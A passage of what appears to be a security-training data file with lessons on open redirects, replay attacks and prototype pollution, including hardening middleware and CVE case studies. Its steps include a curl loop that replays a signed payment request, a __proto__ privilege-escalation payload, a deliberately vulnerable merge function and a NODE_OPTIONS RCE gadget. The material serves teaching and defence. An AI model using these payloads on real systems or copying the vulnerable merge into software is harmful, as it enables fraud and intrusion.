        "A prominent cloud collaboration platform permitted subpath matching for registered OAuth redirect URIs. An attacker discovered an unvalidated redirect parameter on the platform's logout endpoint. By initiating an authorization flow with a crafted redirect URI pointing to the logout endpoint, the authorization code was forwarded to an external server via the HTTP Referer header upon redirection.",
      rootCause:
        'Permissive wildcard matching on OAuth redirect URIs combined with an unvalidated open redirect on the client application.',
      takeaway:
        'OAuth redirect URIs must be exact matches without wildcards. All redirect endpoints must enforce strict relative pathing or origin allowlists.',
    },
    hardeningGuide: {
      title: 'Open Redirect Hardening Guide & Middleware',
      checklist: [
        'Enforce strict relative paths: ensure path starts with a single / and never starts with // or contains backslashes.',
        'Never use substring checks like String.includes() or regex matching against hostnames.',
        'If external redirects are required, validate url.origin against a rigid allowlist of trusted domains.',
        'Use native URL parsers (new URL() in JavaScript, urllib.parse in Python) rather than custom string manipulation.',
        'Never allow wildcards or directory traversal in OAuth redirect_uri registrations (enforce RFC 6749 strict string matching).',
        'Consider signing redirect URLs with an HMAC secret if dynamic redirection across subdomains is required.',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'src/utils/safeRedirect.ts',
        code: `import { Request, Response } from 'express';

const ALLOWED_ORIGINS = new Set([
  'https://app.mycompany.com',
  'https://billing.mycompany.com',
]);

export function safeRedirect(req: Request, res: Response, targetUrl: string | undefined, fallback = '/dashboard') {
  if (!targetUrl || typeof targetUrl !== 'string') {
    return res.redirect(fallback);
  }

  // 1. Check for valid relative URL (blocks //attacker.com and /\\attacker.com)
  if (targetUrl.startsWith('/') && !targetUrl.startsWith('//') && !targetUrl.includes('\\\\')) {
    return res.redirect(targetUrl);
  }

  // 2. Validate absolute URL against strict origin allowlist
  try {
    const parsed = new URL(targetUrl);
    if (ALLOWED_ORIGINS.has(parsed.origin)) {
      return res.redirect(parsed.toString());
    }
  } catch {
    // Malformed URL string
  }

  // 3. Fallback to default safe path
  return res.redirect(fallback);
}`,
        note: 'Checking targetUrl.startsWith("/") && !targetUrl.startsWith("//") eliminates protocol-relative bypasses.',
      },
    },
    faqs: [
      {
        question: 'Why does a URL starting with // redirect to an external site in browsers?',
        answer:
          'In the WHATWG URL standard, a URL beginning with // is a protocol-relative URL. The browser inherits the current scheme (http: or https:) and treats everything following // as the target hostname (e.g. //evil.com becomes https://evil.com).',
      },
      {
        question: 'Are open redirects considered high severity in bug bounty programs?',
        answer:
          'Standalone open redirects are typically rated low or medium severity. However, when chained with OAuth authorization code leaks, SSRF, or cross-site scripting (e.g., via javascript: URIs), their severity escalates to critical.',
      },
    ],
  },
  {
    id: 'replay-attacks',
    title: 'Replay Attacks & Nonce Defenses',
    subtitle:
      'Preventing valid signed API requests and cryptographic transactions from being captured and retransmitted by eavesdroppers',
    track: 'crypto',
    trackTitle: 'Applied Cryptography & Data Protection',
    duration: '14 min',
    level: 'Intermediate',
    summary:
      'A replay attack occurs when an adversary intercepts a valid, authenticated transmission over a network and re-transmits it to execute the action multiple times (such as duplicating a payment transfer or re-using a signed command). Defenses combine cryptographic nonces, sliding timestamp windows, and distributed replay caches.',
    keyConcepts: [
      'Cryptographic Nonces',
      'Sliding-Window Timestamp Validation',
      'Idempotency Keys',
      'HMAC Request Signatures (AWS SigV4)',
      'Distributed Replay Caches (Redis SETNX)',
    ],
    threatModel: {
      actor:
        'Network eavesdropper, malicious intermediary, or rogue client capturing encrypted or signed payloads',
      goal: 'Duplicate financial transactions, re-authenticate with expired credentials, or repeat state-altering administrative operations',
      vulnerability:
        'APIs that verify message integrity and signatures without checking request freshness or uniqueness',
      defense:
        'Cryptographic nonces (Number used ONCE), sliding timestamp windows (e.g. AWS SigV4 ±5 minutes), and distributed in-memory replay caches (Redis)',
    },
    steps: [
      {
        title: 'Step 1: Interception of Valid Signed Request',
        description:
          'An attacker captures a signed API request transmitted by an authenticated client.',
        detail:
          'The client issues a signed request: POST /api/v1/payments/transfer {"to": "Merchant_XYZ", "amount": 100} accompanied by a valid cryptographic HMAC signature. Even if the attacker cannot forge the signature or read the private key, they capture the exact bytes of the request.',
        actionSummary: 'Attacker records legitimate signed payment transmission',
        securityTakeaway:
          'Cryptographic signatures guarantee authenticity and integrity, but do not inherently guarantee freshness.',
        codeSnippet: {
          language: 'http',
          label: 'Captured Signed API Request',
          code: `POST /api/v1/payments/transfer HTTP/1.1
Host: api.bank.com
Content-Type: application/json
X-Signature: hmac_sha256_3f9a1b02c84e...
X-Timestamp: 1735689600

{"to": "Merchant_XYZ", "amount": 100}`,
        },
      },
      {
        title: 'Step 2: The Replay Attack Execution',
        description:
          'The attacker re-transmits the captured request multiple times to duplicate the transaction.',
        detail:
          "Without altering a single byte, the attacker resends the request 10 times. Because the server only checks if HMAC(secret, body) == X-Signature, the signature evaluates as valid every time. The server debits the account 10 times, draining the victim's funds.",
        actionSummary: 'Server verifies signature and duplicates transfer repeatedly',
        securityTakeaway:
          'An API without replay protection treats identical copies of past valid requests as brand new commands.',
        codeSnippet: {
          language: 'bash',
          label: 'Automated Replay Script',
          code: `# Attacker loops re-transmitting exact packet
for i in {1..10}; do
  curl -X POST https://api.bank.com/api/v1/payments/transfer \\
    -H "X-Signature: hmac_sha256_3f9a1b02c84e..." \\
    -d '{"to": "Merchant_XYZ", "amount": 100}'
done`,
        },
      },
      {
        title: 'Step 3: Timestamp Validation & Sliding Windows',
        description: 'Enforcing a strict timestamp tolerance window to reject stale requests.',
        detail:
          'The server requires an X-Timestamp header included in the signed message. If |server_time - client_time| > 300 seconds (5 minutes), the server rejects the request with HTTP 401 Unauthorized. This prevents adversaries from replaying requests days or weeks later.',
        actionSummary: 'Server drops requests with timestamps older than 5 minutes',
        securityTakeaway:
          'Timestamps bound the validity window of a request but cannot stop replays within that 5-minute window.',
        codeSnippet: {
          language: 'typescript',
          label: 'Timestamp Sliding Window Check',
          code: `const MAX_SKEW_SECONDS = 300; // 5 minute window
const now = Math.floor(Date.now() / 1000);
const requestTime = parseInt(req.headers['x-timestamp'], 10);

if (Math.abs(now - requestTime) > MAX_SKEW_SECONDS) {
  return res.status(401).json({ error: 'Request timestamp expired or clock skew too large' });
}`,
        },
      },
      {
        title: 'Step 4: Cryptographic Nonces & Replay Cache',
        description:
          'Requiring a unique nonce per request and tracking seen nonces in a fast distributed cache.',
        detail:
          'Clients generate a cryptographically random nonce (X-Nonce: nonce_9a8f2c1b) for every request. The server attempts to store the nonce in Redis with an expiration matching the timestamp window (e.g. 5 minutes). If Redis reports the nonce already exists, the request is flagged as a replay and blocked.',
        actionSummary: 'Redis atomic SETNX rejects previously observed nonces',
        securityTakeaway:
          'Pairing nonces with bounded timestamp windows keeps the replay cache memory footprint small and predictable.',
        codeSnippet: {
          language: 'typescript',
          label: 'Atomic Nonce Check with Redis',
          code: `// Atomic Redis operation: SET key value NX EX 300
const cacheKey = \`nonce:\${req.user.id}:\${req.headers['x-nonce']}\`;
const isNewNonce = await redis.set(cacheKey, '1', 'EX', 300, 'NX');

if (!isNewNonce) {
  return res.status(409).json({ error: 'Replay detected: nonce has already been processed' });
}`,
        },
      },
      {
        title: 'Step 5: Idempotency Keys for Business State Safety',
        description:
          'Combining nonces with application idempotency keys to ensure at-most-once execution of business operations.',
        detail:
          'For financial operations, clients supply an Idempotency-Key UUID. The server locks the key, processes the transaction, and caches the HTTP response. If network retries or replays occur, the server returns the cached response without re-executing the payment logic.',
        actionSummary: 'Idempotency layer returns cached response without duplicate billing',
        securityTakeaway:
          'Idempotency keys protect both against malicious replays and unintended network retry duplicates.',
        codeSnippet: {
          language: 'typescript',
          label: 'Idempotency Key Handling',
          code: `const idempotencyKey = req.headers['idempotency-key'];
const cachedResponse = await idempotencyStore.get(idempotencyKey);

if (cachedResponse) {
  // Return saved response directly without charging again!
  return res.status(cachedResponse.status).json(cachedResponse.body);
}`,
        },
      },
    ],
    cveCaseStudy: {
      title: 'Ethereum Classic Replay Attack during the DAO Hard Fork',
      cveId: 'DAO Hard Fork Replay Incident',
      year: '2016',
      organization: 'Ethereum / Ethereum Classic (ETC) Ecosystem',
      damage:
        'Millions of dollars worth of ETC tokens drained from cryptocurrency exchanges due to replayable transaction signatures across the split chains.',
      breakdown:
        'When Ethereum hard-forked in 2016 to recover funds from the DAO hack, two chains emerged: ETH and ETC. Because both chains shared identical transaction formats, elliptic curve signature parameters, and nonce counters, any transaction broadcast on the ETH network could be copied and re-broadcast on the ETC network by an eavesdropper. Attackers replayed withdrawal transactions to drain exchanges of their ETC reserves.',
      rootCause:
        'Cryptographic transaction signatures did not bind to a unique chain identifier (Chain ID domain separation).',
      takeaway:
        'Cryptographic messages must include domain separation tags (EIP-155 Chain IDs, protocol identifiers) so signatures valid in one context cannot be replayed in another.',
    },
    hardeningGuide: {
      title: 'Production API Replay Protection Hardening Guide',
      checklist: [
        'Require a client timestamp header (e.g. X-Timestamp) included within HMAC signature payloads.',
        'Reject requests where |now - request_timestamp| > 300 seconds (5 minutes).',
        'Require a high-entropy cryptographic nonce (X-Nonce: crypto.randomUUID()).',
        'Store processed nonces in a fast distributed store (Redis) with a TTL matching the timestamp window (300s) using atomic SET key val EX 300 NX.',
        'Implement Idempotency-Key headers for all state-changing endpoints (POST/PATCH/DELETE) and cache transaction outcomes.',
        'Include full request context (HTTP method, URI path, query parameters, timestamp, and body hash) in the cryptographic signature.',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'src/middleware/replayProtection.ts',
        code: `import { Request, Response, NextFunction } from 'express';
import crypto from 'crypto';
import { redis } from '../lib/redis';

const SKEW_WINDOW_SECONDS = 300; // 5 minutes

export async function replayProtectionMiddleware(req: Request, res: Response, next: NextFunction) {
  const timestampHeader = req.headers['x-timestamp'];
  const nonceHeader = req.headers['x-nonce'];
  const apiKey = req.headers['x-api-key'];

  if (!timestampHeader || !nonceHeader || !apiKey) {
    return res.status(400).json({ error: 'Missing security headers (X-Timestamp, X-Nonce, X-API-Key)' });
  }

  const timestamp = parseInt(timestampHeader as string, 10);
  const now = Math.floor(Date.now() / 1000);

  // 1. Sliding timestamp window check
  if (Math.abs(now - timestamp) > SKEW_WINDOW_SECONDS) {
    return res.status(401).json({ error: 'Request expired: timestamp out of allowed window' });
  }

  // 2. Atomic nonce verification with Redis SET ... NX EX
  const nonceKey = \`replay:\${apiKey}:\${nonceHeader}\`;
  const wasSet = await redis.set(nonceKey, '1', 'EX', SKEW_WINDOW_SECONDS * 2, 'NX');

  if (!wasSet) {
    return res.status(409).json({ error: 'Replay detected: nonce has already been used' });
  }

  return next();
}`,
        note: 'Atomic Redis SETNX with expiration ensures thread-safe, distributed nonce tracking with zero memory leakage.',
      },
    },
    faqs: [
      {
        question: 'How does AWS Signature Version 4 (SigV4) prevent replay attacks?',
        answer:
          'AWS SigV4 includes an x-amz-date timestamp that must fall within 15 minutes of the AWS server clock, and incorporates the request date directly into the key derivation string (DateKey = HMAC(Secret, YYYYMMDD)), scoping cryptographic signatures to a single day.',
      },
      {
        question: 'Does HTTPS/TLS encryption protect against replay attacks?',
        answer:
          'TLS protects against network eavesdroppers replaying TCP packets on the wire (thanks to TLS record sequence numbers). However, TLS terminates at your load balancer or reverse proxy; it cannot stop malicious clients from resending valid HTTP requests, nor does it protect against compromised intermediate proxies.',
      },
    ],
  },
  {
    id: 'prototype-pollution',
    title: 'Prototype Pollution in JavaScript/Node.js',
    subtitle:
      'Exploiting recursive object merges to inject malicious properties into Object.prototype, leading to Remote Code Execution and authentication bypass',
    track: 'exploits',
    trackTitle: 'Web Exploits & Hardened Defenses',
    duration: '16 min',
    level: 'Advanced',
    summary:
      'Prototype pollution is a vulnerability specific to JavaScript runtimes where an attacker injects properties into Object.prototype. Because almost all objects in JavaScript inherit from Object.prototype, injecting keys like isAdmin, env, or shell can lead to authentication bypass, denial of service, and Remote Code Execution (RCE).',
    keyConcepts: [
      'JavaScript Prototype Chain',
      'Object.prototype Pollution',
      'CVE-2019-10744 (Lodash defaultsDeep)',
      'RCE via child_process Gadgets',
      'Object.freeze(Object.prototype)',
    ],
    threatModel: {
      actor: 'Untrusted user submitting crafted JSON or query strings to a Node.js application',
      goal: 'Privilege escalation, denial of service, or Remote Code Execution (RCE via child_process or template engine tampering)',
      vulnerability:
        'Unsafe recursive object merging, cloning, or property path setters (e.g. lodash.merge, lodash.defaultsDeep) without sanitizing __proto__, constructor, and prototype',
      defense:
        'Sanitizing and rejecting prototype keys, using Map or Object.create(null) for dictionary lookups, and running Object.freeze(Object.prototype)',
    },
    steps: [
      {
        title: 'Step 1: The JavaScript Prototype Inheritance Model',
        description: 'How JavaScript objects inherit properties through their prototype link.',
        detail:
          'In JavaScript, objects possess a hidden [[Prototype]] link accessed via __proto__. If a property is accessed on an object (user.isAdmin) and does not exist on the object itself, the runtime walks up the prototype chain to Object.prototype. If a property is added to Object.prototype, every object in the runtime inherits it.',
        actionSummary: 'Runtime traverses prototype chain to resolve missing properties',
        securityTakeaway:
          'Modifying Object.prototype globally mutates every object created across the entire application runtime.',
        codeSnippet: {
          language: 'javascript',
          label: 'Prototype Inheritance Demonstration',
          code: `const normalUser = { name: 'Alice' };

// normalUser does not have isAdmin:
console.log(normalUser.isAdmin); // undefined

// If Object.prototype is modified:
Object.prototype.isAdmin = true;

// Every existing and future object inherits it!
console.log(normalUser.isAdmin); // true!
console.log({}.isAdmin);         // true!`,
        },
      },
      {
        title: 'Step 2: Unsafe Recursive Object Merging',
        description:
          'Vulnerable deep merge functions recursively copy properties from user input without filtering dangerous keys.',
        detail:
          'Web applications often merge user settings into a default configuration object using custom merge functions or older library versions. When a merge function encounters target[key] = source[key] where key is __proto__, it accesses the prototype of target and writes properties directly to Object.prototype.',
        actionSummary: 'Recursive merge function assigns properties to target["__proto__"]',
        securityTakeaway:
          'Object keys named __proto__, constructor, and prototype must be strictly forbidden in merge algorithms.',
        codeSnippet: {
          language: 'javascript',
          label: 'Vulnerable Deep Merge Implementation',
          code: `// VULNERABLE RECURSIVE MERGE
function unsafeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      unsafeMerge(target[key], source[key]); // FLAW: target['__proto__'] resolves to Object.prototype!
    } else {
      target[key] = source[key];
    }
  }
  return target;
}`,
        },
      },
      {
        title: 'Step 3: Polluting Object.prototype via Crafted JSON',
        description:
          'The attacker submits a JSON payload containing __proto__ properties to trigger pollution.',
        detail:
          'When the server parses {"__proto__": {"isAdmin": true}} and merges it into any object, Object.prototype.isAdmin becomes true. Subsequent authorization checks like if (req.user.isAdmin) evaluate to true even for unauthenticated or unprivileged users.',
        actionSummary: 'Attacker payload pollutes Object.prototype with admin privilege',
        securityTakeaway:
          'Prototype pollution turns absence-of-property checks (if (!obj.prop)) into security failures.',
        codeSnippet: {
          language: 'http',
          label: 'Malicious Prototype Pollution Payload',
          code: `POST /api/user/preferences HTTP/1.1
Host: api.saas.com
Content-Type: application/json

{
  "theme": "dark",
  "__proto__": {
    "isAdmin": true,
    "role": "superuser"
  }
}`,
        },
      },
      {
        title: 'Step 4: Escalating to Remote Code Execution (RCE)',
        description:
          'Abusing Node.js core library gadgets (like child_process options or NODE_OPTIONS) to execute shell commands.',
        detail:
          'Prototype pollution often enables RCE through "gadgets". For example, when an application calls child_process.spawn("git", ["status"]), Node.js internally inspects options.shell and options.env. If Object.prototype.shell has been polluted to "/bin/sh" with NODE_OPTIONS, arbitrary commands execute.',
        actionSummary: 'Polluted environment options trigger arbitrary code execution',
        securityTakeaway:
          'A prototype pollution flaw is frequently escalatable to full Remote Code Execution via framework gadgets.',
        codeSnippet: {
          language: 'javascript',
          label: 'Prototype Pollution to RCE Gadget',
          code: `// Attacker pollutes NODE_OPTIONS or shell
Object.prototype.shell = '/bin/sh';
Object.prototype.env = {
  NODE_OPTIONS: '--require /tmp/malicious.js'
};

// When any module executes child_process:
const { spawn } = require('child_process');
spawn('ls'); // Executes /bin/sh with attacker NODE_OPTIONS!`,
        },
      },
      {
        title: 'Step 5: Hardened Defensive Architecture',
        description:
          'Blocking dangerous keys, using Object.create(null), and freezing Object.prototype.',
        detail:
          'Defenses include: 1) Sanitizing forbidden keys (__proto__, constructor, prototype); 2) Using prototype-less dictionaries via Object.create(null) or new Map(); 3) Running Object.freeze(Object.prototype) at process startup to make Object.prototype immutable.',
        actionSummary: 'Enforcing key sanitization and freezing Object.prototype',
        securityTakeaway:
          'Object.freeze(Object.prototype) completely neutralizes prototype pollution attempts at runtime.',
        codeSnippet: {
          language: 'typescript',
          label: 'Hardened Prototype Defenses',
          code: `// 1. Startup Hardening: Freeze prototype
Object.freeze(Object.prototype);

// 2. Safe dictionary lookup without prototype
const safeDict = Object.create(null);
console.log(safeDict.__proto__); // undefined

// 3. Key Allowlisting & Validation
const FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
function safeMerge(target: any, source: any) {
  for (const key of Object.keys(source)) {
    if (FORBIDDEN_KEYS.has(key)) continue; // Block dangerous keys!
    // Safe merge logic...
  }
}`,
        },
      },
    ],
    cveCaseStudy: {
      title: 'CVE-2019-10744: Prototype Pollution in Lodash defaultsDeep',
      cveId: 'CVE-2019-10744',
      year: '2019',
      organization: 'Lodash NPM Package Ecosystem',
      damage:
        'Critical CVSS 7.3 vulnerability impacting millions of Node.js production applications using lodash before version 4.17.12.',
      breakdown:
        'The widely used defaultsDeep and merge functions in lodash traversed nested object properties without checking for constructor or __proto__ keys. Attackers providing untrusted JSON payloads could pollute Object.prototype, causing unexpected property leakage across all objects in the Node.js process and resulting in authentication bypasses or crashes.',
      rootCause:
        'Recursive merge algorithms without property name allowlists or checks against prototype-modifying keys.',
      takeaway:
        'Never use unhardened deep merge or clone utilities on untrusted user input. Keep NPM dependencies updated and audit libraries for prototype pollution.',
    },
    hardeningGuide: {
      title: 'Prototype Pollution Hardening Guide & Safe Merge',
      checklist: [
        'Call Object.freeze(Object.prototype) at application startup to prevent prototype mutation.',
        'Use Map or Object.create(null) for key-value dictionary stores where keys are derived from user input.',
        'Sanitize incoming object keys: block __proto__, constructor, and prototype.',
        'Use JSON schema validators (Zod, Ajv with removeAdditional or strict mode) to strip undefined properties.',
        'Audit third-party dependencies using npm audit or Snyk to catch vulnerable merge/clone packages.',
        'Use the --disable-proto=delete flag in modern Node.js runtimes to disable Object.prototype.__proto__.',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'src/utils/safeMerge.ts',
        code: `const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

export function safeDeepMerge<T extends Record<string, any>>(target: T, source: Record<string, any>): T {
  for (const key of Object.keys(source)) {
    // 1. Guard against prototype pollution keys
    if (DANGEROUS_KEYS.has(key)) {
      continue;
    }

    const sourceVal = source[key];

    // 2. Recursively merge plain objects
    if (sourceVal && typeof sourceVal === 'object' && !Array.isArray(sourceVal)) {
      if (!target[key] || typeof target[key] !== 'object') {
        target[key as keyof T] = {} as any;
      }
      safeDeepMerge(target[key], sourceVal);
    } else {
      // 3. Assign primitive or array values safely
      target[key as keyof T] = sourceVal;
    }
  }

  return target;
}`,
        note: 'Filtering DANGEROUS_KEYS ensures Object.prototype cannot be traversed or modified during deep merge.',
      },
    },
    faqs: [
      {
        question: 'Can Prototype Pollution occur in compiled languages like Go, Rust, or Java?',
        answer:
          'No. Prototype pollution is specific to prototype-based dynamic languages like JavaScript and Python (where class attribute pollution can occur). Statically typed languages with class inheritance do not have mutable runtime prototypes.',
      },
      {
        question: 'What does Node.js flag --disable-proto=delete do?',
        answer:
          'The Node.js --disable-proto=delete flag removes the Object.prototype.__proto__ getter/setter accessor at startup, preventing legacy __proto__ property assignments while keeping modern Object.getPrototypeOf() functional.',
      },
    ],
  },
];
